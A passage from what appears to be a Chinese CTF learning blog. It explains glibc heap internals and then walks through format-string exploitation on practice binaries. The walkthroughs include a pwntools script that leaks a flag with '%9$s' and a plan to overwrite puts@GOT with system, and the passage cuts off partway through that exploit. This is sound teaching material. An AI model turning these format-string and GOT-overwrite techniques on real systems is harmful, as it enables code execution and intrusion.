大小不同的第一个空闲块，不包含 bin 的头指针。</p></li><li><p><strong>bk_nextsize</strong> ：指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</p></li></ul></li></ul><blockquote><p>如果一个 chunk 处于 free 状态，会有两个位置记录其相应的大小：本身的 size 字段和它后一个 chunk 的 prev_size 字段。</p></blockquote><p>已经被分配的chunk结构如下，我们称前两个字段称为 chunk header，后面的部分称为 user data。每次 malloc 申请得到的内存指针，也就是 mem 其实指向 user data 的起始处（这才是用户真正申请到的可利用内存）：</p><p><img src="/img/%E5%A0%86%E6%A6%82%E8%BF%B0/usechunk.png"></p><p>被释放的 chunk 被记录在链表中（可能是循环双向链表，也可能是单向链表）。具体结构如下：<br><img src="/img/%E5%A0%86%E6%A6%82%E8%BF%B0/freechunk.png"></p><h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><p>用户释放掉的 chunk 不会马上归还给系统，而是由堆管理器统一管理 heap 和 mmap 映射区域中的空闲的 chunk。空闲的 chunk 我们称之为 bin 。</p><p>在实际的实现中，堆管理器采用分箱式方法对空闲的 chunk 进行管理。根据大小将 bin 分为4类：fast bin , small bin , large bin , unsorted bin。在此基础上，每一类 bin 当中内存大小相似的会由双向链表链接，也就是说每类 bin 的内部仍然会有多个互不相关的链表来保存不同大小的 chunk 。</p><p>对于 small bins，large bins，unsorted bins 来说，ptmalloc 将它们维护在同一个数组中。这些 bin 对应的数据结构在 malloc_state 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NBINS 128</span><br>mchunkptr bins[ NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span> ];<br></code></pre></td></tr></table></figure><p><code>bins</code> 主要用于索引不同 bin 的 fd 和 bk。以 32 位系统为例，bins 前 4 项的含义如下：</p><table><thead><tr><th>下标</th><th>0</th><th>1</th><th>2</th><th>3</th></tr></thead><tbody><tr><td>含义</td><td>bin1 的 fd&#x2F;bin2 的 prev_size</td><td>bin1 的 bk&#x2F;bin2 的 size</td><td>bin2 的 fd&#x2F;bin3 的 prev_size</td><td>bin2 的 bk&#x2F;bin3 的 size</td></tr></tbody></table><p>可以看到，bin2 的 prev_size、size 和 bin1 的 fd、bk 是重合的。由于我们只会使用 fd 和 bk 来索引链表，所以该重合部分的数据其实记录的是 bin1 的 fd、bk。虽然后一个 bin 和前一个 bin 共用部分数据，但是其实记录的仍然是前一个 bin 的链表数据。通过这样的复用，可以节省空间。</p><p>数组中的 bin 依次如下：</p><ul><li>第一个是 <strong>unsorted bins</strong>，这里面的bin都没有进行排序，相对杂乱</li><li>索引从 2 到 63 的 bin 称为 <strong>small bin</strong>s。同一个链表中的 chunk 大小相等，两个相邻索引的 small bin 链表中的 chunk 大小相差的字节数为 2 个机器字长，即 32 位相差 8 字节，64 位相差 16 字节。</li><li>small bins 后面的 bin 被称作 <strong>large bins</strong>。large bin 中的每一个 bin 都包含一定范围内的 chunk，其中的 chunk 按 fd 指针的顺序从大到小排列。相同大小的 chunk 同样按照最近使用顺序排列。</li></ul><h5 id="Fast-bins"><a href="#Fast-bins" class="headerlink" title="Fast bins"></a>Fast bins</h5><p>有很多的程序都会申请以及释放一些小内存块，如果小内存块释放以后存在与之相邻的空闲的 chunk ，我们将它们进行合并，那么当下一次再次申请相应大小的 chunk 时，就需要再次对 chunk 进行分割，这样就大大降低了堆的利用效率。</p><p>为了解决这个问题，ptmalloc 中专门设计了 <code>fast bin</code>，顾名思义它用来快速分配内存。</p><p>当用户需要的 chunk 的大小小于 fastbin 的最大值时， 堆管理器会首先判断 fastbin 中相应的 bin 中是否有对应大小的空闲块，如果有的话，就会直接从这个 bin 中获取 chunk。如果没有的话，堆管理器才会进行接下来的一系列操作。</p><blockquote><p>在32位系统中，系统默认的 fast bin 大小为 64 字节，但实际上它可以处理最大 80 字节的数据空间。除此之外，fast bin 可以支持的 bin 的个数为10个，从数据空间为 8 字节开始一直到 80 字节。</p></blockquote><p>fast bins 的特点：</p><ul><li><p>采用<strong>单向链表</strong>对其中的每个 bin 进行组织</p></li><li><p>每个 bin 采取 LIFO 策略，也就是<strong>后进先出</strong>的方式，最近释放的 chunk 会更早地被分配。</p></li></ul><h5 id="Small-bins"><a href="#Small-bins" class="headerlink" title="Small bins"></a>Small bins</h5><p>small bins 就是 small chunk，当中每个 chunk 的大小与其所在的 bin 的 index 的关系为：<code>chunk_size = 2 * SIZE_SZ *index</code>，具体如下：</p><table><thead><tr><th>下标</th><th>2</th><th>3</th><th>4</th><th>5</th><th>x</th><th>63</th></tr></thead><tbody><tr><td>SIZE_SZ&#x3D;4（32 位）</td><td>16</td><td>24</td><td>32</td><td>40</td><td>2*4*x</td><td>504</td></tr><tr><td>SIZE_SZ&#x3D;8（64 位）</td><td>32</td><td>48</td><td>64</td><td>80</td><td>2*8*x</td><td>1008</td></tr></tbody></table><p>small bins 的特点：</p><ul><li>采用<strong>双向链表</strong>对 bin 进行管理。每个链表都有链表头结点，且每个链表中存储的 chunk 大小都一致。</li><li>每个 bin 对应的链表采用 FIFO 的规则，也就是<strong>先进先出</strong>，所以同一个链表中先被释放的 chunk 会先被分配出去。</li></ul><h5 id="Large-bins"><a href="#Large-bins" class="headerlink" title="Large bins"></a>Large bins</h5><p>large bins 是用于管理较大内存块的数据结构。</p><p>和small bins相同，large bins采用<strong>双向链表</strong>进行管理，同时采用采用 FIFO 的规则。</p><h5 id="Unsorted-bin"><a href="#Unsorted-bin" class="headerlink" title="Unsorted bin"></a>Unsorted bin</h5><p>unsorted bin 是用于管理未分类的空闲内存块的数据结构。当一个内存块被释放时，堆内存管理器会将其添加到 unsorted bin 中，而不是直接合并到其他特定大小范围的 bin 中。</p><p>unsorted 的字面意思就是” 不可回收” 的意思，可以看作将不可回收的垃圾（不满足能够进行内存分配的堆块）都放到这个” 垃圾桶” 中。</p><h3 id="Top-chunk"><a href="#Top-chunk" class="headerlink" title="Top chunk"></a>Top chunk</h3><p>程序第一次进行 malloc 的时候，heap 会被分为两块，一块给用户，剩下的那块就是 top chunk。</p><p>其实，所谓的 top chunk 就是处于当前堆的物理地址最高的 chunk 。这个 chunk 不属于任何一个 bin，它的作用在于当所有的 bin 都无法满足用户请求的大小时，如果其大小不小于指定的大小，就进行分配，并将剩下的部分作为新的 top chunk。否则，就对 heap 进行扩展后再进行分配。</p><p>需要注意的是，top chunk 的 <em>prev_inuse</em> 比特位始终为 1，否则其前面的 chunk 就会被合并到 top chunk 中。</p><h3 id="Last-remainder"><a href="#Last-remainder" class="headerlink" title="Last remainder"></a>Last remainder</h3><p>在用户使用 malloc 请求分配内存时，ptmalloc2 找到的 chunk 可能并不和申请的内存大小一致，这时候就将分割之后的剩余部分称之为 last remainder chunk ，由 unsorted bin 进行存储。</p><p>需要注意的是 top chunk 分割剩下的部分不会作为 last remainder。</p><h2 id="宏观结构"><a href="#宏观结构" class="headerlink" title="宏观结构"></a>宏观结构</h2><h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h3><p>arena 是指一块用于管理和分配内存的区域，是内存池的一种。它是堆内存管理的一种组织方式，每个 arena 都是一个独立的内存区域，用于管理特定范围内的内存块。默认情况下，glibc 为每个线程分配一个 arena，以减少不同线程之间的竞争和锁冲突。</p><blockquote><p>main_arena 并不在申请的 heap 中，而是一个全局变量，在 libc.so 的数据段。</p></blockquote><p>需要注意的是，并不是每一个线程都有对应的 arena（使用了系统级的内存分配方式如 mmap() 等，线程可能会绕过 glibc 的内存分配机制，因此没有与 glibc 相关联的 arena；除此之外也可以手动设置限制线程的 arena 创建数量）。</p><h5 id="分配规则"><a href="#分配规则" class="headerlink" title="分配规则"></a>分配规则</h5><ul><li><p><code>arena</code>: 有一个 main_arena ，是由主线程创建的，thread_arena 则为各线程创建的，当 arena 满了之后就不再创建而是与其他 arena 共享一个 arena，方法为依次给各个 arena 上锁（查看是否有其他线程正在使用该arena），如果上锁成功（没有其他线程正在使用），则使用该 arena ，之后一直使用这个 arena ，如果无法使用则阻塞等待。</p></li><li><p><code>heap</code>：等级比arena要低一些，一个 arena 可以有多个 heap，也是存储了堆相关的信息。</p></li><li><p><code>chunk</code>：分配给用户的内存的一个单位，每当我们分配一段内存的时候其实就是分配得到了一个 chunk ，我们就可以在 chunk 当中进行一定的操作了。不过为了进行动态分配，chunk 本身也有一些数据（元数据），是用来指示其分配等等的数据。</p></li></ul><h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><p>当程序刚刚开始运行时，每一个线程是没有自己的 heap 区域的，需要程序主动申请内存。当程序使用完了这个  heap 的资源，就必须要再次申请，并且一般情况下申请的 heap 是不连续的。我们就需要 heap_info这个数据结构来记录不同 heap 之间的链接关系。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span></span><br><span class="hljs-class">&#123;</span><br>  mstate ar_ptr;                 <span class="hljs-comment">//对应的arena的地址               </span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span> *<span class="hljs-title">prev</span>;</span>       <span class="hljs-comment">//上一个 heap_info 的地址   </span><br>  <span class="hljs-type">size_t</span> size;                   <span class="hljs-comment">//当前堆的大小        </span><br>  <span class="hljs-type">size_t</span> mprotect_size;          <span class="hljs-comment">//堆实际使用的内存大小</span><br>  <span class="hljs-type">char</span> pad[<span class="hljs-number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK]; <span class="hljs-comment">//填充字段，用于对齐 _heap_info 结构体的大小</span><br>&#125; heap_info;<br></code></pre></td></tr></table></figure><p>特点：</p><ul><li>使用单向链表进行链接</li><li>需要确保 <code>MALLOC_ALIGN_MASK+1</code> 对齐，所以可能会用到 <em>pad</em>，</li></ul><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><p>malloc_state 结构用于管理堆，记录每个 arena 当前申请的内存的具体状态，比如说是否有空闲 chunk，有什么大小的空闲 chunk 等等。无论是 thread arena 还是 main arena，它们都只有一个 malloc state 结构。</p><blockquote><p>由于 thread 的 arena 可能有多个，所以它的 malloc state 结构会在最新申请的 arena 中。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> &#123;</span><br>    __libc_lock_define(, mutex);            <span class="hljs-comment">//用于控制程序串行访问同一个分配区,实现访问的互斥锁。</span><br>    <span class="hljs-type">int</span> flags;                              <span class="hljs-comment">//标志位，用于记录一些状态信息</span><br>    mfastbinptr fastbinsY[ NFASTBINS ];     <span class="hljs-comment">//fastbin 的空闲块链表,存放每个 fast chunk 链表头部的指针</span><br>    mchunkptr top;<span class="hljs-comment">//最顶部的内存块，用于指示当前可用的内存位置</span><br>    mchunkptr last_remainder;               <span class="hljs-comment">//最近一次分割的小块内存请求剩余部分的内存块</span><br>    mchunkptr bins[ NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span> ];        <span class="hljs-comment">//用于存储 unstored bin，small bins 和 large bins 的 chunk 链表</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> binmap[ BINMAPSIZE ];      <span class="hljs-comment">//标识某一个 bin 中是否包含空闲 chunk</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next</span>;</span>              <span class="hljs-comment">//指向下一个 arena 的指针，形成了一个链表结构</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next_free</span>;</span>         <span class="hljs-comment">//指向下一个空闲的 arena 的指针，形成了一个链表结构。</span><br>    INTERNAL_SIZE_T attached_threads;       <span class="hljs-comment">//附加到此 arena 的线程数量</span><br>    INTERNAL_SIZE_T system_mem;             <span class="hljs-comment">//在该 arena 中从系统分配的内存总量</span><br>    INTERNAL_SIZE_T max_system_mem;         <span class="hljs-comment">//在该 arena 中从系统分配的内存的最大值</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>要注意的是，main arena 的 malloc_state 并不是 heap segment 的一部分，而是一个全局变量，存储在 libc.so 的数据段。</strong></p><h2 id="内存分配背后的系统调用"><a href="#内存分配背后的系统调用" class="headerlink" title="内存分配背后的系统调用"></a>内存分配背后的系统调用</h2><p>我们在程序代码中使用 malloc 函数和 free 函数来申请和分配内存。但实际上与系统交互的并不是这两个函数而是</p><p><code>(s)brk</code> 函数以及 <code>mmap</code> 函数，它们之间的关系如下：</p><p><img src="/img/%E5%A0%86%E6%A6%82%E8%BF%B0/malloc_sys.png"></p><p>具体的结构如下图（和网上的那些图一样，我重做一张图是因为网上的都是英文，我的英语水平不高看不懂😅）：</p><blockquote><p>要注意的是，并不是所有的 ”堆“ 都在 Heap 区域，mmap 对应 <code>Memory Mapping Segment</code> ，brk 才是对应 <code>Heap</code> 的。</p><p>下图为32位程序的虚拟内存结构，64位的虚拟地址大小为8GB，但结构大致相同。</p></blockquote><p><img src="/img/%E5%A0%86%E6%A6%82%E8%BF%B0/stack_heap.png"></p><p>如上图，我们的 malloc 函数是在用户空间对应的 0~3G 的内存进行操作，但用户空间的代码不能直接访问内核空间，因此需要借用 sbrk() 等系统函数充当与内核之间的接口。当然我们也可以直接在用户空间的代码中使用系统调用，进而越过接口直接与系统内核交互，也能达到同样的效果（但是系统调用的效率会相对较低）。</p><p><code>brk</code> 适用于小块内存的分配和释放，而 <code>mmap</code> 适用于大块内存的分配和一些特殊需求（例如映射文件到内存），接下来会进行详细的分析。</p><p>我们主要来分析申请堆块的操作</p><h4 id="brk-与-sbrk"><a href="#brk-与-sbrk" class="headerlink" title="brk 与 sbrk"></a>brk 与 sbrk</h4><p>这两个函数都是通过改变 peogram break （程序中断点）的位置来改变数据段长度，进而实现虚拟内存到物理内存的映射。</p><h5 id="brk"><a href="#brk" class="headerlink" title="brk"></a>brk</h5><p> <code>brk</code> 通过修改数据段的末尾地址实现内存的分配与回收。它的原型为  <code>void *brk(void *addr);</code> ，其中参数 <em>addr</em> 是新的 Heap 段结束地址。调用 <code>brk</code> 后，操作系统将 Heap 段的结束地址设置为 <em>addr</em>，并将 Heap 段扩展或缩小至新的结束地址。</p><p>初始时，堆段的起始地址 <em>start_brk</em> 以及结束位置 <em>brk</em> 指向同一位置，根据程序是否开启了 ASLR保护，位置会有所不同 ：</p><ul><li>不开 ASLR 保护时， <em>start_brk</em> 以及 <em>brk</em> 会指向 data&#x2F;bss 段的结尾；</li><li>开启 ASLR 保护时，<em>start_brk</em> 以及 <em>brk</em> 会指向 data&#x2F;bss 段后的随机偏移处（两个指针仍指向同一处）</li></ul><h5 id="sbrk"><a href="#sbrk" class="headerlink" title="sbrk"></a>sbrk</h5><p><code>sbrk  </code> 通过控制间断点向前或向后移动指定长度字节来实现内存的分配与回收。它的原型为 <code>void *sbrk(intptr_t increment);</code>，其中参数 <em>increment</em> 是需要增加或减小的字节数，根据 <em>increment</em> 数值的不同，对应的变化也不相同：</p><ul><li>当 <em>increment</em> 为正数时，peogram break 会向高地址移动相应的字节数，同样堆的大小会增加相应的字节数，相当于申请内存；</li><li>当 <em>increment</em> 为负数时，peogram break 会向低地址移动相应的字节数，同样堆的大小会减小相应的字节数，相当于释放内存；</li><li>当 <em>increment</em> 为 0 时，peogram break 不移动位置，同样函数只返回当前位置。</li></ul><h4 id="mmap-与-munmap"><a href="#mmap-与-munmap" class="headerlink" title="mmap 与 munmap"></a>mmap 与 munmap</h4><p><code>mmap</code> 函数是一种内存映射文件的方法，将文件或者其他对象映射到进程的地址空间，实现文件磁盘地址和进程虚拟地址空间中的某一段虚拟地址的一一对应关系。</p><p><img src="/img/%E5%A0%86%E6%A6%82%E8%BF%B0/mmap.png"></p><p>映射关系一旦建立，就可以直接再内存中对映射的文件进行读写，对应的操作会直接反映在映射的文件上，不用再借用系统调用函数了。</p><p><code>mmap</code> 的函数原型是 <code>void * mmap(void * addr, size_t length,int prot,int flags,int fd,off_t offset);</code> ，其中 <em>length</em> 是指定的映射长度，它并没有严格要求必须填入操作系统分页大小的整数倍，但是操作系统会自动向上取整，确保映射的长度满足对其要求。</p><p><code>munmap</code> 函数用于解除映射关系，其函数原型为 <code>int munmap(void * addr, size_t length);</code> ，<em>addr</em> 为函数返回接收的地址，<em>length</em> 为请求分配的长度。</p><hr><p>未完待续🤗</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>格式化字符串进阶版</title>
    <link href="/2023/07/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/"/>
    <url>/2023/07/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/</url>
    
    <content type="html"><![CDATA[<p>习题和一些解题技巧</p><span id="more"></span><h1 id="64-位程序格式化字符串漏洞"><a href="#64-位程序格式化字符串漏洞" class="headerlink" title="64 位程序格式化字符串漏洞"></a>64 位程序格式化字符串漏洞</h1><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>之前学习基础的时候我们都把程序编译成32位，64位的漏洞原理也是相似的，只不过还是传参方式上的细微差别。虽然我们并没有向相应寄存器中放入数据，但是程序依旧会按照格式化字符串的相应格式对其进行解析。</p><h4 id="🌰："><a href="#🌰：" class="headerlink" title="🌰："></a>🌰：</h4><p>题目在这里：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck">pwn200 GoodLuck</a> </p><blockquote><p>这道题目的原题里有获取本地flag.txt文件的代码部分，我们要本地复现的话需要自己新建一个flag.txt文件</p></blockquote><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/goodluck_run.png"></p><p>看看源代码，主要逻辑就是先获取flag内容放在v10里，获取用户输入进行对比，如果用户输入的flag正确，则输出flag，也就是说我们要让 <code>v10[j]=v4</code> 。</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/goodluck_main.png"></p><p>我们可以看出这是一个格式化字符串漏洞。根据格式化字符串解题的步骤，我们首先确定格式化字符串变量的偏移位置。</p><p>在printf处下断点，注意我们要输出的是题目的flag，所以获取的是题目flag的偏移。</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/gdb_padding.png"></p><p>我们可以看出相对应的 flag 是栈上的第四个变量，除此之外，64位的程序前六个变量储存在寄存器中，而 fmt 字符串又在 rdi 上，所以 flag 相对于 fmt 字符串的偏移就是（剩余的五个寄存器+4）&#x3D;9。</p><p>或者也可以利用工具比如 pwndbg ，有一条 <code>fmtarg [目标地址]</code> 的指令可以直接输出偏移。注意要把断点断在printf。</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/goodkuck_pwndbg.png"></p><p>最终的exp为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./goodluck&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;%9$s&#x27;</span><br>p.sendline(payload)<br><span class="hljs-built_in">print</span> p.recv()<br>p.interactive()<br></code></pre></td></tr></table></figure><p>甚至本地复现都不用exp（x</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/goodluck_exp.png"></p><p><del>(三个问号是因为我偷懒设置的本地flag和题目原本的flag长度不一样)</del></p><h1 id="hijack-GOT"><a href="#hijack-GOT" class="headerlink" title="hijack GOT"></a>hijack GOT</h1><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>当前ELF编译系统使用延迟绑定的技术来实现对共享库的调用过程，主要由GOT表和PLT表实现。</p><p>原理大致为 : 当目标模块存在一个外部共享库的函数调用时，在汇编层面使用 call 指令实现调用，其作用为跳转至对应函数的 PLT 表项处执行，该表项的第一条指令为 jmp *[ 对应 GOT 项的地址 ]，第一次执行函数调用时，通过 GOT 与 PLT 的合作，会将最终调用函数的地址确定下来，并存放在其对应的 GOT 表项中。当后续再发生调用时， jmp *[ 对应 GOT 项的地址 ] 指令即表示直接跳转至目标函数处执行。</p><p>在C程序中，libc函数都是通过GOT表跳转的。同时，如果程序没有开启RELRO保护，那么每个LIBC函数对应的GOT表项是可以被修改的。我们就可以借此修改某一个函数的GOT表地址为另一个函数，从而进行目标函数的调用。</p><p>假设我们需要将函数A的地址覆盖为函数B的地址，步骤为：</p><ul><li>确定 A 的 GOT 表地址</li><li>确定 B 的地址</li><li>将B的地址写入 A 对应的 GOT 表处</li></ul><h4 id="🌰：-1"><a href="#🌰：-1" class="headerlink" title="🌰："></a>🌰：</h4><p>题目在这里： <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2016-CCTF-pwn3">2016 CCTF 中的 pwn3</a> </p><h5 id="分析题目"><a href="#分析题目" class="headerlink" title="分析题目"></a>分析题目</h5><p>查看保护</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwn3_checksec.png"></p><p>查看一下源码逻辑</p><p>首先在main函数中的 <code>ask_username() </code>函数中有一个 scanf 函数，并通过循环将输入值的ASCII码值加一赋值给 dest，也就是主函数中的s1。</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwn3_askname.png"></p><p>注意 <code>ask_password</code> 部分的判断条件，也就是我们最开始的输入要求是 <code>&quot;sysbdmin&quot;</code> 对应的每一字母的ASCII码值减一。</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwn3_askpassword.png"></p><p>可以在payload里写一个如下的函数： <del>（最后结果是 rxraclhm</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">password</span>():<br>    admin=<span class="hljs-string">&#x27;sysbdmin&#x27;</span><br>    name=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> admin:<br>        name+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>进入程序主循环后，查看每个函数的功能，三个函数对应模拟 FTP 的操作。没有地方可以栈溢出，要按照程序的逻辑一步一步进行。</p><p><code>put_file()</code> 函数：</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwn3_putfile.png"></p><p>由于 <code>file_head</code> 变量位于 BSS 段上，是全局变量。每次调用 <code>put_file()</code> 函数时，当前 <code>file_head</code> 存储的地址都是上一次分配的地址，赋值给 <code>v0[60]</code>，调用即将结束时会将本次的地址赋值给 <code>file_head</code> ，将会在下一次调用函数时赋值给对应的变量。如此就在栈上形成链表关系，可以通过遍历链表来访问之前保存的文件信息。</p><p><code>show_dir()</code> ：</p><p>读取 <code>put_file() </code>中形成的链表的内容也就是文件的名称并存储在 s 中，最后调用 <code>puts()</code> 输出 s。</p><p> <code>get_file()</code> 函数:</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwn3_getfile.png"></p><p>有 <code>printf(dest)</code> 没有加格式化字符串，可以任意写和读。</p><p>需要注意的是我们不能控制程序跳转到 <code>get_file()</code> 再直接 get flag，<del>那样不高级</del> 程序设置检查输入“ flag ”会返回输出警告。</p><blockquote><p>做题原则：没有一个函数是多余的🤨</p></blockquote><h5 id="漏洞利用思路："><a href="#漏洞利用思路：" class="headerlink" title="漏洞利用思路："></a>漏洞利用思路：</h5><ul><li>绕过最开始的检查密码。</li><li>利用 <code>printf()</code> 获取 puts 的 GOT 地址，进而获得 system 函数的地址。</li><li>利用 <code>printf()</code> 修改 puts 的 GOT 表地址为 system 函数的地址。</li><li>将<code>show_dir()</code> 函数中 <code>puts()</code> 的参数也就是读取的文件信息改为” bin&#x2F;sh “。</li></ul><p>首先确定格式化字符串变量对应的偏移</p><p>找到 printf 的地址下断点用 gdb 调试一下，不要直接 <code>b printf</code>，那样会在每个 printf 都停一次，效率低低哒🤪<br><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwn3_printf_addr.png"></p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwn3_printf_stack.png"></p><p>可以看出是第七个参数。知道了参数的偏移就可以利用 printf 输出 put 的地址和修改 put 的 GOT 表地址啦。</p><p>在这里我们可以用到 pwntools 中的 fmtstr_payload 函数，函数返回一个完整的 payload。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">fmtstr<span class="hljs-constructor">_payload(<span class="hljs-params">offset</span>, <span class="hljs-params">writes</span>, <span class="hljs-params">numbwritten</span>=0, <span class="hljs-params">write_size</span>=&#x27;<span class="hljs-params">byte</span>&#x27;)</span><br></code></pre></td></tr></table></figure><ul><li>offset：对应格式化字符串的偏移</li><li>writes：需要利用%n写入的数据，采用字典形式。比如我们要将 printf 的 GOT 数据改为 system 函数地址，就写成 <code>&#123;printfGOT: systemAddress&#125;</code></li><li>numbwritten：已经输出的字符个数，默认值为0，也可另附值</li><li>write_size：写入方式，分类有字节（byte）、双字节（short）和四字节（int），对应着 hhn、hn 和 n，默认值是byte。</li></ul><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br><br>sh=process(<span class="hljs-string">&#x27;./pwn3&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwn3&#x27;</span>)<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>admin=<span class="hljs-string">&#x27;sysbdmin&#x27;</span><br>name=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> admin:<br>name+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">1</span>)   <span class="hljs-comment">#绕过密码检查登，陆密码rxraclhm</span><br>sh.recvuntil(<span 